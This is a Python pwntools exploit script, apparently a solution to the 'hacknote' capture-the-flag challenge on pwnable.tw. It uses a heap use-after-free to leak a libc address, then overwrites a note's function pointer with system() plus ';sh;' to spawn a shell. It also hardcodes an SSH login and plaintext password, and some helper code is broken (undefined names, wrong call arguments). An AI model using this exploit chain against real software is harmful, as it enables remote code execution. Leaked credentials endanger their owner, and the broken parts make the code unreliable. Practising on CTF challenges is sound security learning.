from pwn import * # Import pwntools


####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './hacknote_patched'

LIBC = ELF('./libc.so.6')
if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10102) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('tqtnk2000', '2019shell1.picoctf.com', password='quangtien123')
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid,'b free')



##########################
##### FUNCTION ######
##########################

def add(page_size,content):
	P.sendlineafter(b'choice :',b'1')
	P.sendlineafter(b'size :',str(page_size))
	P.sendlineafter(b'Content :',content)
	print('Add 1 page with size ', page_size,'and content:',content.decode('ascii','ignore'))

def remove(page_index):
	P.sendlineafter(b'choice :',b'2')
	P.sendlineafter(b'Index :',str(page_index))
	print('Remove page ', page_index)
	
def read(page_index):
	P.sendlineafter(b'choice :',b'3')
	P.sendlineafter(b'Index :',str(page_index))
	P.recvline()
	recv = P.recvline().strip()
	print('Page ', page_index, ' content: ',recv)
	return recv

def fillupTcache(size,from_index):
	for i in range(0,7):
		add(size)
	for i in range(0,7):
		remove(i+from_index)

#####################
#### Find Gadgets ###
#####################
#try:
#    libc_func = 'puts'
#    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
#except:
    #libc_func = 'printf'
    #PUTS_PLT = ELF_LOADED.plt['printf']

#MAIN_PLT = ELF_LOADED.symbols['main']
#POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
#RET = (ROP_LOADED.find_gadget(['ret']))[0]

#log.info('Main start: ' + hex(MAIN_PLT))


#########################
#### Finf LIBC offset ###
#########################


add(80,b'abcd')
add(30,b'abcd')
remove(0)
add(80,b'abd')
leak = read(2)
system = u32(leak) - 0x1b07b0 + 0x0003a940
print(hex(LIBC.address))
remove(1)
remove(2)
add(8,p32(system)+b';sh;')

##############################
##### FINAL EXPLOITATION #####
##############################

P.interactive()




